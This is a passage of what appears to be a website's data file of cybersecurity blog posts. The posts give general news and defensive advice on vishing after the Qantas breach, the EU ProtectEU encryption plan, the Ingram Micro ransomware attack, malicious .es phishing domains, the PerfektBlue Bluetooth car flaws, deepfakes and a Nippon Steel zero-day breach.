    <p>The Catwatchful incident reminds us that mobile devices are treasure troves of sensitive data — and attackers know it. With millions of Android users worldwide still sideloading apps and ignoring permissions, campaigns like Catwatchful are likely to continue thriving.</p>

    <p>Education, vigilance, and modern security tools are essential to keep your data and privacy intact.</p>

    <blockquote>🐾 A watchful cat sees everything — but so should you. Don’t let spyware stalk your phone.</blockquote>
  `},{id:"vishing-rise-australia-qantas-breach",title:"Vishing Attacks Surge in Australia Following Qantas Breach: How AI and Social Engineering Exploit the Human Factor",date:"2025-07-07",author:"Ethical Byte",summary:"Australia’s privacy watchdog reports a sharp rise in vishing attacks after the Qantas breach, exposing how attackers exploit trust and urgency to bypass digital defenses.",tags:["vishing","social engineering","qantas breach","ai phishing","australia","human factor"],imageKey:"vishingQantas",content:`
    <h3>📞 Vishing Is Back — and Smarter Than Ever</h3><br>
    <p>In the wake of the highly publicized <strong>Qantas data breach</strong>, Australia’s Office of the Australian Information Commissioner (OAIC) issued a sobering warning: <strong>vishing (voice phishing) attacks have surged by 46%</strong> nationwide.</p>

    <p>While much attention has focused on technical vulnerabilities, the Qantas breach highlights another critical weak spot — humans. Attackers are now using more sophisticated methods, even <strong>AI-generated voices</strong>, to trick employees into handing over access and data over the phone.</p>

    <h3>🔍 What Exactly Is Vishing?</h3><br>
    <p>Vishing — short for “voice phishing” — is a social engineering tactic where cybercriminals call their targets, posing as trusted figures such as IT support, managers, or even law enforcement. Their goal? To manipulate victims into providing sensitive information, approving access, or performing actions that compromise security.</p>

    <p>Recent vishing calls tied to the Qantas breach include:</p>
    <ul>
      <li>Posing as help desk technicians requesting login credentials to fix an “urgent outage”</li>
      <li>Imitating senior managers demanding immediate action to avoid penalties</li>
      <li>Using cloned AI voices to sound exactly like a known supervisor or coworker</li>
    </ul>

    <h3>🎭 Why Are Humans the Weakest Link?</h3><br>
    <p>Attackers rely on a few predictable human traits:</p>
    <ul>
      <li>⏳ <strong>Urgency</strong> — “We need this fixed NOW or the company loses money”</li>
      <li>🎩 <strong>Authority</strong> — “This is your manager. Just give me the password.”</li>
      <li>🤝 <strong>Trust</strong> — “I’m from IT. We spoke yesterday.”</li>
    </ul>

    <p>Combined with high stress environments, like customer support or call centers, these tactics often succeed — even against trained employees.</p>

    <h3>🧪 What’s New About These Attacks?</h3><br>
    <p>What makes this current wave of vishing more dangerous is the integration of <strong>artificial intelligence (AI)</strong>:</p>
    <ul>
      <li>🤖 AI voice cloning replicates tone, accent, and speech patterns of real people</li>
      <li>🎙️ Deepfake audio can even simulate conference calls or voicemails from executives</li>
      <li>📈 Attackers script dynamic, context-aware conversations instead of static pretexts</li>
    </ul>

    <p>This means employees can no longer rely on “recognizing the voice” or gut feeling alone to detect fraud.</p>

    <h3>📉 Lessons from the Qantas Breach</h3><br>
    <p>Investigators suspect that attackers gained initial access to Qantas systems by tricking a third-party call center employee via a vishing call. From there, they escalated privileges and moved laterally across networks, resulting in massive customer data exposure and operational disruption.</p>

    <p>This incident underlines the fact that even the best firewalls and endpoint protections can’t stop someone who’s verbally persuaded to open the door.</p>

    <h3>🛡️ OAIC’s Recommendations</h3><br>
    <p>The OAIC has outlined a set of best practices to defend against vishing:</p>
    <ul>
      <li>✅ Require <strong>multi-factor verification</strong> before making account changes or granting access</li>
      <li>✅ Educate employees about AI-enabled social engineering techniques</li>
      <li>✅ Empower staff to challenge and escalate suspicious calls without fear of reprimand</li>
      <li>✅ Enforce strict protocols for verifying the identity of callers requesting sensitive actions</li>
      <li>✅ Audit third-party vendors regularly and hold them to the same security standards</li>
      <li>✅ Deploy voice authentication or anomaly detection tools where applicable</li>
    </ul>

    <h3>🌎 Beyond Australia: A Global Concern</h3><br>
    <p>While this warning was issued in Australia, the threat is not limited by geography. Similar attacks have been reported in the U.S., U.K., and Asia — often tied to breaches in industries like aviation, finance, and healthcare.</p>

    <p>In our hyper-connected, high-pressure workplaces, anyone with a phone can be a target — and a gateway — for attackers.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The Qantas breach and subsequent vishing surge are stark reminders that cyber defense is not just about technology — it’s about people. The human element remains the most exploited vulnerability in security.</p>

    <p>Organizations that invest in awareness, clear policies, and support for employees who “pause and verify” will be far better positioned to fend off these attacks.</p>

    <blockquote>📞 Think before you speak. The voice on the line might not be who you think it is.</blockquote>
  `},{id:"eu-decrypt-private-data-protecteu",title:"The EU Wants to Decrypt Citizens’ Private Data by 2030: What It Means for Your Privacy",date:"2025-07-08",author:"Ethical Byte",summary:"The European Union’s ProtectEU plan proposes lawful access to encrypted communications by 2030 — sparking a heated debate on privacy, security, and human rights.",tags:["eu","encryption","privacy","surveillance","protecteu","human rights"],imageKey:"euProtectEU",content:`
    <h3>🔐 The EU’s ProtectEU Plan Explained</h3><br>
    <p>In July 2025, the European Union announced a controversial proposal under its <strong>ProtectEU initiative</strong> to grant law enforcement agencies <strong>lawful access to encrypted communications by 2030</strong>. The plan would effectively allow authorities to decrypt private messages sent through popular end-to-end encrypted (E2EE) platforms like <em>WhatsApp, Signal, iMessage, and others</em>.</p>

    <p>The EU argues that strong encryption—while vital for privacy—also enables criminals to operate in secrecy. ProtectEU is positioned as a way to combat <strong>child exploitation, terrorism, and organized crime</strong> without completely dismantling privacy protections.</p>

    <h3>🧪 How Would This Work?</h3><br>
    <p>The ProtectEU proposal envisions a future where technology firms build “<strong>lawful interception</strong>” solutions into their platforms, allowing authorized law enforcement—under a valid court order—to decrypt and access messages. This would require adding a <strong>backdoor mechanism</strong> to break E2EE on demand.</p>

    <h3>🕵️ Why Privacy Advocates Are Alarmed</h3><br>
    <p>Critics, including privacy groups, cybersecurity experts, and human rights organizations, argue that adding backdoors to encryption is fundamentally dangerous because:</p>
    <ul>
      <li>⚠️ <strong>Weakened Security:</strong> Any backdoor, no matter how well-intentioned, can be discovered and abused by hackers or hostile states.</li>
      <li>⚠️ <strong>Erosion of Trust:</strong> Users may stop using platforms perceived as insecure, undermining confidence in the digital ecosystem.</li>
      <li>⚠️ <strong>Scope Creep:</strong> Measures designed for one purpose (e.g., fighting terrorism) could expand to surveil dissent or target minorities.</li>
    </ul>

    <h3>⚖️ The EU’s Justification</h3><br>
    <p>The EU insists that:</p>
    <ul>
      <li>✅ Only <strong>authorized law enforcement</strong> with court oversight would have access.</li>
      <li>✅ ProtectEU aims to balance security and privacy via strict legal and technical controls.</li>
      <li>✅ They seek cooperation from tech companies to create solutions that minimize abuse risk.</li>
    </ul>

    <h3>🌍 What This Means for Users</h3><br>
    <p>If implemented, ProtectEU could reshape the way privacy and security are balanced across Europe — and potentially set a precedent globally. Users may see changes in:</p>
    <ul>
      <li>🔒 Encryption standards and app functionality</li>
      <li>📄 Privacy policies of communication platforms</li>
      <li>👀 Who can access their messages and under what conditions</li>
    </ul>

    <h3>🧠 Key Concerns & Potential Risks</h3><br>
    <ul>
      <li>Cybercriminals exploiting built-in backdoors</li>
      <li>Political misuse of surveillance powers</li>
      <li>Chilling effect on freedom of speech and journalism</li>
      <li>Fragmentation of global internet standards if users flee to services outside the EU</li>
    </ul>

    <h3>✅ What Can You Do?</h3><br>
    <p>Until ProtectEU becomes law (if it does), you can still protect your digital privacy:</p>
    <ul>
      <li>🔍 Stay informed about policy changes and debates.</li>
      <li>📣 Participate in public consultations, petitions, or advocacy efforts if you value strong encryption.</li>
      <li>🛑 Avoid platforms already weakening encryption or collecting excessive metadata.</li>
      <li>🗝️ Choose apps committed to robust, transparent, and zero-knowledge encryption as long as legally permitted.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The EU’s ProtectEU plan ignites an age-old debate: how much privacy are we willing to sacrifice for security? While stopping crime is essential, creating systemic weaknesses in encryption could endanger everyone — not just the guilty.</p>

    <blockquote>🔐 Privacy isn’t just about hiding something; it’s about protecting everyone. Once the backdoor is open, no one knows who will walk through it.</blockquote>
  `},{id:"ransomware-attack-ingram-micro-2025",title:"Ransomware Attack Disrupts Global Operations at Ingram Micro",date:"2025-07-09",author:"Ethical Byte",summary:"One of the world’s largest IT distributors, Ingram Micro, suffered a ransomware attack causing widespread outages, disrupting global supply chains, and raising serious questions about resilience in critical industries.",tags:["ransomware","ingram micro","supply chain","it distribution","incident response","cyber resilience"],imageKey:"ingramMicroRansomware",content:`
    <h3>💻 Ingram Micro Hit by Ransomware</h3><br>
    <p>Just before the July 4 holiday weekend, <strong>Ingram Micro</strong>, a critical player in global IT distribution, was targeted in a major <strong>ransomware attack</strong> that disrupted its systems and operations worldwide.</p>

    <p>The attack forced Ingram Micro to shut down parts of its network, halting customer order processing and some internal workflows to prevent further damage and limit the spread of malware. Law enforcement and cybersecurity experts were brought in immediately to investigate and assist with recovery.</p>

    <h3>🕵️ What We Know So Far</h3><br>
    <ul>
      <li>🏢 Ingram Micro confirmed its IT infrastructure was compromised by ransomware.</li>
      <li>📉 Systems handling procurement, logistics, and partner interactions went offline.</li>
      <li>🔎 No public evidence yet of stolen or leaked data, though investigations continue.</li>
      <li>⏳ Recovery is ongoing — while some services have been restored, full restoration is expected to take time.</li>
    </ul>

    <h3>🌎 Global Impact of the Outage</h3><br>
    <p>Ingram Micro’s role as an intermediary between manufacturers, resellers, and end customers means its disruption reverberates across the IT industry supply chain:</p>
    <ul>
      <li>🚫 Delays in fulfilling hardware & software orders.</li>
      <li>📦 Logistics bottlenecks for resellers & partners dependent on its distribution network.</li>
      <li>🌐 End customers experiencing extended lead times and order confusion.</li>
      <li>💰 Potential financial losses and contractual penalties for all involved parties.</li>
    </ul>

    <p>This incident highlights how a single cyberattack on a pivotal supplier can create a domino effect, disrupting hundreds or thousands of businesses downstream.</p>

    <h3>📣 Ingram Micro’s Response</h3><br>
    <p>In a statement, Ingram Micro emphasized their commitment to recovery and security:</p>
    <ul>
      <li>✅ “We are working diligently to restore operations securely and as quickly as possible.”</li>
      <li>✅ Law enforcement and third-party cybersecurity teams are involved in mitigation efforts.</li>
      <li>✅ Customers are encouraged to contact account managers for the most current updates.</li>
    </ul>

    <h3>⚖️ Why Supply Chains Are Attractive Targets</h3><br>
    <p>Supply chain hubs like Ingram Micro are lucrative ransomware targets because they touch thousands of businesses — amplifying the impact and urgency of the attack. By disrupting a critical node in the chain, attackers increase their leverage and the likelihood of ransom payments.</p>

    <p>Similar incidents have previously struck companies like Colonial Pipeline, Maersk, and Kaseya, proving this is a persistent and evolving threat.</p>

    <h3>🧪 How Ransomware Campaigns Typically Work</h3><br>
    <p>Though details of the attack are still emerging, ransomware campaigns often follow this pattern:</p>
    <ul>
      <li>🎣 Initial access via phishing, credential theft, or vulnerable systems.</li>
      <li>🛠️ Lateral movement to compromise critical servers and backups.</li>
      <li>🔒 Deployment of ransomware payload to encrypt files & systems.</li>
      <li>💰 Ransom demand in cryptocurrency in exchange for decryption keys.</li>
    </ul>

    <h3>🔐 Lessons & Recommendations for Customers and Partners</h3><br>
    <p>While Ingram Micro works to restore systems, customers and partners should take these steps:</p>
    <ul>
      <li>🔒 Stay in regular contact with your Ingram Micro representatives for updates.</li>
      <li>📑 Review and validate orders placed just before and after the outage.</li>
      <li>🛑 Be wary of phishing emails posing as Ingram Micro during recovery efforts.</li>
      <li>💼 Assess your own business continuity & disaster recovery plans to handle supplier disruptions.</li>
      <li>🌐 Consider diversifying critical suppliers where possible to reduce dependency risks.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The Ingram Micro ransomware incident is a stark reminder of the fragility of interconnected supply chains and the immense cost of insufficient cyber resilience. Protecting critical suppliers — and holding them to high security standards — is no longer optional but essential for business continuity.</p>

    <p>As attackers continue to exploit high-value nodes in global networks, organizations must prepare for not just direct attacks but also collateral damage from breaches in their ecosystem.</p>

    <blockquote>💻 In supply chains, you’re only as strong as your weakest link. Stay vigilant, diversify risk, and build resilience before the next attack hits.</blockquote>
  `},{id:"malicious-es-domains-cloudflare",title:"Malicious .es Domains Surge: Hosted on Cloudflare, Random Names Help Defenders Spot Them",date:"2025-07-10",author:"Ethical Byte",summary:"Researchers report a 19× rise in malicious .es domains hosted on Cloudflare, using randomly generated names for phishing — which ironically makes them easier to detect.",tags:[".es domains","phishing","cloudflare","malware","domain security","tld threats"],imageKey:"maliciousEsDomains",content:`
    <h3>🌐 Malicious .es Domains on the Rise</h3><br>
    <p>According to a July 2025 report from <strong>Cofense</strong>, security researchers have detected a sharp <strong>19× increase</strong> in malicious domains using Spain’s country-code TLD (<strong>.es</strong>) over the past six months.</p>

    <p>Nearly all of these domains were hosted via <strong>Cloudflare</strong>, which attackers exploit for its fast content delivery, global reach, and masking capabilities. But while this makes the campaigns effective, it also leaves behind clues defenders can use.</p>

    <h3>🕵️ What Makes These Domains Suspicious?</h3><br>
    <p>Researchers noticed that these malicious domains featured <strong>machine-generated, random-looking subdomain names</strong> — nonsensical strings of characters that are highly unlikely to belong to legitimate Spanish businesses.</p>

    <p>Examples include domains like:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>f9bxk.ztrmqvyheso.es</li>
      <li>qx1jp.lkhdxvenbty.es</li>
    </ul>

    <p>These names are generated automatically so attackers can spin up thousands of unique domains rapidly and bypass traditional blocklists.</p>

    <h3>⚠️ Why It Matters</h3><br>
    <ul>
      <li>🚩 Random names help attackers evade blocklists but also make them stand out to defenders.</li>
      <li>🌍 Many phishing campaigns spoof well-known brands but use meaningless domains, which savvy users and tools can catch.</li>
      <li>🔓 Hosting on Cloudflare provides attackers with anonymity and performance, but defenders can monitor .es TLD traffic for anomalies.</li>
    </ul>

    <h3>📧 How Are These Domains Used?</h3><br>
    <p>The vast majority of these domains are used for <strong>credential phishing campaigns</strong> targeting major global brands. Cofense’s analysis showed:</p>
    <ul>
      <li>Microsoft — spoofed in 95% of observed campaigns</li>
      <li>Adobe</li>
      <li>Google</li>
      <li>DocuSign</li>
      <li>U.S. Social Security Administration</li>
    </ul>

    <p>Beyond phishing, a smaller number of domains delivered malware, including Remote Access Trojans (RATs) like <strong>XWorm</strong>, <strong>Dark Crystal</strong>, and <strong>ConnectWise</strong>.</p>

    <h3>🔐 What Can Defenders Do?</h3><br>
    <p>Fortunately, the randomness of these domains provides a useful detection opportunity. Defenders are encouraged to:</p>
    <ul>
      <li>✅ Implement domain heuristics to detect and block nonsensical, random-looking names.</li>
      <li>✅ Actively monitor .es TLD traffic, even if your organization doesn’t have Spanish operations.</li>
      <li>✅ Be wary of domains hosted on Cloudflare with no branding or clear ownership.</li>
      <li>✅ Educate employees about phishing tactics, especially those spoofing major brands.</li>
    </ul>

    <h3>📊 Example Pattern of Suspicious Domains</h3><br>
    <p>Below are examples of the kinds of domains flagged by researchers:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>r4ykp.hdlmcxzqjvo.es</li>
      <li>j2kxl.ptnvhwyeqrz.es</li>
    </ul>

    <p>Note the meaningless subdomains and their use of .es — patterns defenders can use to build detection rules.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>Attackers will continue innovating, but sometimes their automation creates obvious patterns. These .es domains are a perfect example: randomized names intended to evade blocklists actually make them <strong>easier for defenders to flag</strong>.</p>

    <blockquote>🌐 Stay vigilant. Look beyond the TLD — focus on patterns and anomalies that attackers can’t hide.</blockquote>
  `},{id:"perfektblue-bluetooth-car-hacking",title:"PerfektBlue Attack Exposes Millions of Connected Vehicles to Remote Bluetooth Hacking",date:"2025-07-11",author:"Ethical Byte",summary:"Critical vulnerabilities in a popular Bluetooth stack expose millions of vehicles to remote hacking. Here’s everything you need to know about PerfektBlue and how to protect yourself.",tags:["perfektblue","bluetooth","car hacking","automotive cybersecurity","openskynergy","iot security"],imageKey:"perfektBlueCarHack",content:`
    <h3>🚗 PerfektBlue: A New Threat to Connected Vehicles</h3><br>
    <p>On July 11, researchers uncovered a set of critical vulnerabilities in <strong>OpenSynergy’s Blue SDK</strong> — a Bluetooth protocol stack integrated into millions of connected vehicles around the world. This attack, named <strong>PerfektBlue</strong>, highlights how attackers can exploit flaws in the car’s wireless interface to gain control without even touching it.</p>

    <h3>🪲 What Happened?</h3><br>
    <p>The vulnerabilities lie in the way Blue SDK processes certain malformed Bluetooth packets. Attackers within wireless range can craft malicious packets to crash the Bluetooth stack or gain control over the car’s infotainment and diagnostic systems — potentially even affecting safety-critical components.</p>

    <p>This means attackers can:</p>
    <ul>
      <li>🎙️ Eavesdrop on conversations or data transmissions.</li>
      <li>🖥️ Inject malicious code into vehicle systems.</li>
      <li>⚠️ Manipulate driver-assist features or disable alerts.</li>
    </ul>

    <h3>📡 Why It Matters</h3><br>
    <p>Modern vehicles are essentially mobile computers — and Bluetooth is a key interface for drivers to connect their devices. With PerfektBlue, attackers can bypass physical security measures entirely, attacking cars wirelessly from a parking lot, street, or even another vehicle.</p>

    <p>Such attacks could expose personal data, interfere with driving, or serve as a stepping stone for further compromises — a significant risk as cars become increasingly autonomous and connected.</p>

    <h3>🧪 How Does the Attack Work?</h3><br>
    <p>The flaw comes from improper validation of malformed or malicious Bluetooth messages by the Blue SDK. Attackers use a laptop and a Bluetooth antenna to craft packets that exploit these flaws, leading to:</p>
    <ul>
      <li>🚫 Denial of service (crashing the stack).</li>
      <li>📥 Remote code execution inside the vehicle’s systems.</li>
    </ul>

    <p>Since Bluetooth has a limited range, attackers must be within tens of meters — but in crowded urban areas or parking structures, that’s trivial to achieve.</p>

    <h3>🛞 Who’s Affected?</h3><br>
    <ul>
      <li>✅ Vehicles from multiple, yet-unnamed manufacturers that use OpenSynergy’s Blue SDK.</li>
      <li>✅ Infotainment units and possibly other IoT devices built with the same stack.</li>
    </ul>

    <p>Researchers have notified OpenSynergy, which is preparing and distributing patches to automakers and vendors.</p>

    <h3>🚨 Real-World Scenario</h3><br>
    <p>Picture this: you park your car at a mall. A hacker nearby scans for vulnerable vehicles. They send crafted Bluetooth packets to your car, crashing its infotainment system, stealing contact lists, or disabling driver-assist warnings — all without touching the car. PerfektBlue turns a harmless convenience into a dangerous backdoor.</p>

    <h3>🔧 What You Should Do</h3><br>
    <p><strong>For Automakers & Suppliers:</strong></p>
    <ul>
      <li>✅ Deploy OpenSynergy’s firmware updates as soon as available.</li>
      <li>✅ Inform customers about risks and patch timelines transparently.</li>
      <li>✅ Audit current vehicle configurations for Bluetooth security posture.</li>
    </ul>

    <p><strong>For Drivers:</strong></p>
    <ul>
      <li>📱 Contact your dealer/service center and ask about software updates.</li>
      <li>🔒 Turn off Bluetooth when not in use to minimize exposure.</li>
      <li>🚨 Pay attention to strange behavior in your infotainment or safety systems and report it.</li>
    </ul>

    <p><strong>For Security Teams:</strong></p>
    <ul>
      <li>🧪 Test all patches thoroughly before rollout.</li>
      <li>📡 Monitor for suspicious Bluetooth activity in parking lots and corporate facilities.</li>
      <li>🔬 Regularly review and harden your fleet’s wireless configurations.</li>
    </ul>

    <h3>🌟 Key Lessons</h3><br>
    <p>The PerfektBlue attack reminds us that every connected feature comes with risk. Cars, like smartphones and laptops, need constant vigilance and updates to stay secure. Bluetooth is convenient, but also a gateway — and attackers are watching.</p>

    <blockquote>🚗 Treat your car like your phone: every wireless connection is a potential door. Make sure you’re the only one holding the keys.</blockquote>
  `},{id:"cyber-talk-july",title:"Join Us for Cyber Talk 2025 – Your Questions, Answered!",date:"2025-07-12",author:"Team EthicalByte",summary:"A live, interactive cybersecurity event hosted by EthicalByte’s CEO , COO & CTO, where we decode trends, certifications, tools, and career paths in cyber. Register now and take the first step toward your future in cybersecurity.",tags:["event","cybersecurity career","certifications","ethicalbyte","future of cybersecurity"],imageKey:"cyberTalk2025Banner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#1e2f48;margin-top:0;">🚨 <br> Cyber Talk 2025 <br>Live Cybersecurity Career Event</h3><br>
      <p><strong>Hosted by:</strong> EthicalByte CEO, COO & CTO</p>
      <p><strong>Date:</strong> July 12, 2025</p>
      <p><strong>Format:</strong> Virtual + Interactive Q&A</p>
      <p>Whether you're a beginner or already exploring the cybersecurity space, this event is designed to give you clarity, direction, and insider knowledge on how to grow in cybersecurity in 2026 and beyond.</p>
      
      <div style="text-align:center; margin: 20px 0;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#2563eb;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;display:inline-block;">📩 Register Now</a>
      </div>
      
      <h3>📌 What We’ll Cover</h3><br>
      <ul>
        <li><strong>Do you need cybersecurity certifications?</strong> Which ones actually matter in 2026?</li>
        <li><strong>Should you pursue a degree in cybersecurity?</strong> Pros, cons, and alternatives.</li>
        <li><strong>What should you learn first?</strong> Tools, skills, and the right mindset for beginners.</li>
        <li><strong>Is coding required?</strong> What domains need it—and which don’t.</li>
        <li><strong>Building a home lab:</strong> Tools, platforms, and legal hacking practice.</li>
        <li><strong>How to land your first job or internship?</strong> Resume tips, portfolio advice, and where to apply.</li>
        <li><strong>Specialist or generalist?</strong> Choosing your cybersecurity path smartly.</li>
      </ul>

      <h3>🎙️ Expert Panel</h3><br>
      <p>This session will be hosted by our <strong>CEO</strong> and <strong>CTO , COO</strong> who bring years of industry knowledge, startup experience, and mentorship insights. Expect practical advice—not just theory.</p>

      <h3>🛠️ Interactive Q&A</h3><br>
      <p>Ask anything! We’ll be answering live questions from the audience. Whether it’s about hacking tools, certifications, lab setup, or career doubts—this is your chance to ask directly.</p>

      <h3>🎯 Who Should Attend?</h3><br>
      <ul>
        <li>College students exploring cybersecurity</li>
        <li>Beginners who want to enter the field in 2026</li>
        <li>Professionals looking to upskill or switch careers</li>
        <li>Anyone curious about certifications, hacking tools, or job preparation</li>
      </ul>

      <h3>🚀 Why Attend?</h3><br>
      <p>This is not just a session—it’s a career starter. Real strategies. Real clarity. From real experts. Let EthicalByte help you plan your journey into the world of cybersecurity.</p>

      <div style="margin-top:30px;text-align:center;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#007bff;color:#fff;padding:14px 28px;border-radius:8px;text-decoration:none;font-size:16px;font-weight:bold;">🚀 Secure Your Seat</a>
      </div>
    </div>
  `},{id:"rise-of-deepfake-attacks",title:"The Rise of Deepfake Attacks: A Growing Cybersecurity Nightmare",date:"2025-07-11",author:"Harshit Agarwal & Dr. Neetha S.S",summary:"Deepfakes have evolved from harmless fun to a dangerous cyber threat undermining trust itself. This blog explores how deepfake attacks work, real-world examples, and how individuals & organizations can defend against them.",tags:["deepfake","cybersecurity","AI threats","trust","Christ University"],imageKey:"deepfakeThreatBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>When AI Becomes a Weapon: The New Reality of Deepfake Attacks</h3><br>
      <p>Deepfakes started as a novelty—funny memes, celebrity face swaps, or creative videos. But those days of innocent entertainment are gone. Today, deepfake technology has evolved into a sophisticated weapon in the hands of cybercriminals, capable of causing reputational, financial, and even geopolitical damage.</p>
      
      <p>Unlike traditional cyber threats that target systems and data, deepfakes target something far more valuable: <strong>trust</strong>. If you can’t believe what you see or hear, human communication itself starts to crumble. With the rapid evolution of AI, these attacks are becoming more frequent, convincing, and dangerous.</p>
      
      <h3>Anatomy of a Deepfake Attack</h3><br>
      <p>Picture this: you’re a finance manager, and you receive a video call from your CEO urgently asking to transfer ₹4 crores to a vendor. The voice, the face — everything seems authentic, but something feels … off. Welcome to the new era of CEO fraud, powered by deepfakes.</p>
      
      <p>Deepfakes use AI to craft hyper-realistic audio and video, indistinguishable from reality to the untrained eye. Here are some ways cybercriminals exploit this technology:</p>
      <ul>
        <li><strong>CEO Fraud 2.0:</strong> Instead of spoofed emails, attackers now create convincing video calls requesting urgent fund transfers.</li>
        <li><strong>Disinformation Avalanche:</strong> Fake videos manipulate stock prices, sway elections, and damage reputations in hours.</li>
        <li><strong>Identity Theft on Steroids:</strong> Synthetic videos of individuals are used for blackmail, fraud, or harassment.</li>
        <li><strong>The Revenge Factor:</strong> Personal vendettas turn digital with deepfake-driven harassment and psychological trauma.</li>
      </ul>

      <p>In 2023, a major energy company lost over $240,000 after a deepfake audio of their CFO was used to convince an employee to authorize a transfer. Similar attacks have targeted political campaigns, celebrities, and even journalists—showing how no one is immune.</p>

      <h3>The Science Behind the Deception</h3><br>
      <p>At the core of deepfakes lie <strong>Generative Adversarial Networks (GANs)</strong> — two AI systems in constant battle. One generates fake content while the other tries to detect it, improving each iteration until the fake becomes indistinguishable from reality. This adversarial training process makes deepfakes more sophisticated with each generation.</p>
      
      <p>This technology, once confined to research labs, is now easily accessible through open-source software and even mobile apps. With just a smartphone and some creativity, anyone can create a deepfake convincing enough to deceive colleagues, clients, and even family members.</p>

      <h3>Why Are Deepfakes So Effective?</h3><br>
      <p>Humans are hardwired to trust their senses. Seeing is believing—or so we thought. Deepfakes exploit this cognitive bias, creating an emotional response before critical thinking kicks in. Moreover, in moments of urgency—like financial requests or crises—victims are less likely to pause and verify authenticity.</p>

      <p>This psychological manipulation makes deepfakes not just a technical challenge, but a human one too.</p>

      <h3>Fighting Fire with Fire: How to Defend Against Deepfakes</h3><br>
      <p>While deepfakes are advancing rapidly, so are our defense mechanisms. Here are actionable strategies:</p>

      <h3>1️⃣ Train Your Human Firewall</h3><br>
      <ul>
        <li><strong>Trust but Verify:</strong> Institute mandatory verification protocols for financial and sensitive requests.</li>
        <li><strong>Spot the Signs:</strong> Look for unnatural blinking, inconsistent lighting, poor lip-syncing, robotic audio—these are common giveaways.</li>
        <li><strong>Conduct Deepfake Drills:</strong> Make security training engaging and realistic by simulating deepfake scenarios.</li>
      </ul>

      <h3>2️⃣ Deploy the Tech Arsenal</h3><br>
      <ul>
        <li><strong>Watermarking:</strong> Embed invisible digital fingerprints in authentic content to verify originality.</li>
        <li><strong>AI vs. AI:</strong> Use AI tools that analyze pixel-level anomalies and voiceprint patterns to detect deepfakes.</li>
        <li><strong>Next-Gen Biometrics:</strong> Move beyond facial recognition to heartbeat patterns, breathing analysis, and subtle micro-expressions.</li>
      </ul>

      <h3>3️⃣ Build a Security-First Culture</h3><br>
      <ul>
        <li>Encourage skepticism without fostering fear.</li>
        <li>Use multiple communication channels for critical decisions—don’t rely solely on video or audio.</li>
        <li>Stay informed about the latest deepfake trends and detection tools.</li>
      </ul>

      <h3>The Road Ahead: A Personal Reflection</h3><br>
      <p>Deepfakes challenge a fundamental human assumption: that our senses don’t lie. But like any disruptive technology, they bring both risks and opportunities. With awareness, education, and the right tools, we can turn the tide.</p>
      
      <p>We must remain vigilant without succumbing to paranoia, skeptical yet humane, and harness technology to defend rather than fear. In the battle between authentic human connection and artificial deception, we still have the upper hand—if we’re smart and proactive about it.</p>

      <h3>Real-World Case Study: The Power of a Single Deepfake</h3><br>
      <p>In 2024, a fabricated video of a political leader making inflammatory statements went viral overnight, sparking protests and a temporary market crash. Analysts later confirmed it was a deepfake—but the damage was already done. This illustrates the urgency of building resilience against such attacks at both individual and institutional levels.</p>

      <h3>About the Authors</h3><br>
      <p><strong>Harshit Agarwal</strong> is a BCA student at Christ University with a focus on cybersecurity and emerging digital threats.</p>
      <p><strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic insight and fresh perspective into the growing menace of deepfakes.</p>
    </div>
  `},{id:"nippon-steel-zero-day",title:"Nippon Steel Confirms Zero-Day Attack Exposed Sensitive Data",date:"2025-07-12",author:"EthicalByte",summary:"Japan’s largest steelmaker, Nippon Steel, suffered a sophisticated zero-day cyberattack that exposed business partner, customer, and employee information. This incident underscores the vulnerability of industrial giants to advanced threats.",tags:["zero-day","nippon steel","manufacturing security","data breach","industrial cybersecurity"],imageKey:"nipponSteelBreachBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>🔍 <br> Cybersecurity Incident: Nippon Steel Hit by Zero-Day Attack</h3><br>
      <p>In a stark reminder that no organization is immune, <strong>Nippon Steel</strong>, Japan’s largest steelmaker and a cornerstone of global manufacturing, confirmed it fell victim to a sophisticated <strong>zero-day cyberattack</strong>. The breach resulted in unauthorized access to sensitive data — a wake-up call for industries worldwide.</p>

      <h3>What Happened?</h3><br>
      <p>According to the company’s disclosure:</p>
      <ul>
        <li>Attackers exploited a previously unknown <strong>zero-day vulnerability</strong> in one of Nippon Steel’s internal systems.</li>
        <li>They gained <strong>unauthorized access</strong> to three major categories of data:</li>
        <ul>
          <li>📁 Business partner information</li>
          <li>👥 Customer records</li>
          <li>👤 Employee data</li>
        </ul>
        <li>The company has not yet revealed which software or system was compromised — likely to avoid tipping off other potential attackers.</li>
      </ul>

      <h3>Why Does This Matter?</h3><br>
      <p>This incident underscores two critical truths:</p>
      <ul>
        <li>⚠️ <strong>Critical infrastructure & manufacturing remain high-value targets</strong> — not just banks and tech companies.</li>
        <li>🕵️ Zero-day exploits — flaws unknown to the vendor & public — are highly effective because no patch exists when attackers strike.</li>
      </ul>
      <p>Such incidents can disrupt supply chains, hurt reputations, and erode trust in industries already under cyber siege.</p>

      <h3>The Impact</h3><br>
      <ul>
        <li>🔓 Leakage of sensitive corporate and personal data, potentially putting individuals and partners at risk of further attacks, fraud, or identity theft.</li>
        <li>📉 Loss of trust among stakeholders — partners and customers may rethink their reliance on Nippon Steel.</li>
        <li>💼 Legal & regulatory scrutiny, especially if personal data protection laws like GDPR or Japan’s APPI were violated.</li>
      </ul>

      <h3>Company’s Response</h3><br>
      <p>Nippon Steel acted promptly after discovering the breach:</p>
      <ul>
        <li>✅ Patched the vulnerability after identifying the exploit path.</li>
        <li>✅ Isolated and secured affected systems to stop further access.</li>
        <li>✅ Launched a forensic investigation with the help of cybersecurity experts and law enforcement agencies.</li>
        <li>✅ Enhanced monitoring to watch for follow-up or lateral movement attacks.</li>
      </ul>
